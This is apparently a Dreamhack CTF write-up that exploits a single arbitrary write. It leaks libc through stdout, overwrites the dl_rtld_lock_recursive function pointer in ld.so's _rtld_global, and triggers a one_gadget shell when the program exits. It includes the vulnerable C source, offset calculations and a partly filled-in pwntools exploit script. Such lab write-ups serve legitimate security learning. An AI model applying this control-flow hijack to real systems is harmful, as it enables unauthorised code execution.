---
title: "[Dreamhack] rtld - Hijack _rtld_global Function Pointer"
date: 2024-01-13 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, arbitrary-write, ld-so, rtld, one-gadget, dreamhack]
author: datious
description: "Dreamhack writeup: rtld — dùng arbitrary-write để overwrite dl_rtld_lock_recursive trong _rtld_global (ld.so), trigger one_gadget khi program exit."
---

# [Write up for Dreamhack] Challenge: rtld
**Author: datious**

## 1. Analyzing the Source Code

```c
// gcc -o rtld rtld.c -fPIC -pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;   // ← Arbitrary Write!
    return 0;
}
```

**Checksec:** PIE, Partial RelRO, Canary found, NX enabled.

**What the program gives us:**
- `stdout` address → pointer to `_IO_2_1_stdout_` in libc
- A **single arbitrary write**: write any 8-byte `value` to any `addr`

We **cannot** return to `get_shell()` since we have no binary leak (PIE enabled and no binary address disclosed).

However, there are **one_gadgets** in libc that execute `execve("/bin/sh")`.

## 2. Idea: Hijack function pointer in ld.so

After `main()` returns, glibc runs:

```
exit() → __run_exit_handlers() → _dl_fini()  [in ld.so]
```

`_dl_fini()` runs destructors of all loaded shared objects. Before inspection, it **locks a mutex via a function pointer**:

```c
#define __rtld_lock_lock_recursive(NAME) \
    GL(dl_rtld_lock_recursive)(&(NAME).mutex)

void _dl_fini(void) {
    ...
    __rtld_lock_lock_recursive(GL(dl_load_lock));   // called via FUNCTION POINTER
    ...
}
```

`GL(dl_rtld_lock_recursive)` is a **function pointer** inside `_rtld_global` structure in `ld.so`, **always called when the program exits** — regardless of `rtld.c` code!

**Strategy:** Use the arbitrary-write to overwrite this pointer with a `one_gadget` address. When `_dl_fini` runs, it unintentionally calls `one_gadget` → `execve("/bin/sh")`.

## 3. Calculate Addresses

```python
# Leak stdout:
libc_base = leak - libc.sym['_IO_2_1_stdout_']  # offset 0x3c5620 for libc-2.23

# ld.so base = libc_base + GAP
# GAP = offset from libc base to ld.so base (find with: vmmap in GDB)
ld_base = libc_base + GAP

# _rtld_global is at: ld_base + 0x226040
rtld_global = ld_base + 0x226040

# dl_rtld_lock_recursive field offset within _rtld_global: +0xf08
dl_rtld_lock_recursive = rtld_global + 0xf08

# Write:
addr  = dl_rtld_lock_recursive
value = libc_base + one_gadget_offset
```

## 4. Finding the Correct GAP

**Pitfall:** The GAP (libc→ld.so base difference) varies between environments.

- Local: `GAP = 0x400000` — works locally, fails on server.
- Server: Use `readelf -d /lib/x86_64-linux-gnu/libc.so.6` + `ldd` output to find exact offsets.

```bash
ldd ./rtld
# Shows: libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2
#         /lib64/ld-linux-x86-64.so.2
python3 -c "
import subprocess
r = subprocess.run(['ldd', './rtld'], capture_output=True, text=True)
print(r.stdout)
"
```

→ Map the exact addresses and calculate GAP precisely.

## 5. Final Exploit

```python
from pwn import *

elf  = ELF('./rtld')
libc = ELF('./libc.so.6')
ld   = ELF('./ld.so')

p = remote("host3.dreamhack.games", PORT)

# Leak stdout
p.recvuntil("stdout: ")
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.sym['_IO_2_1_stdout_']
log.info(f"libc base: {hex(libc.address)}")

# Calculate ld base (GAP must be determined for target env)
GAP = ...   # determine from server's memory layout
ld.address  = libc.address + GAP

rtld_global             = ld.address + 0x226040
dl_rtld_lock_recursive  = rtld_global + 0xf08

one_gadget = libc.address + 0x...   # find with one_gadget tool

p.sendlineafter("addr: ",  str(dl_rtld_lock_recursive))
p.sendlineafter("value: ", str(one_gadget))

p.interactive()
```
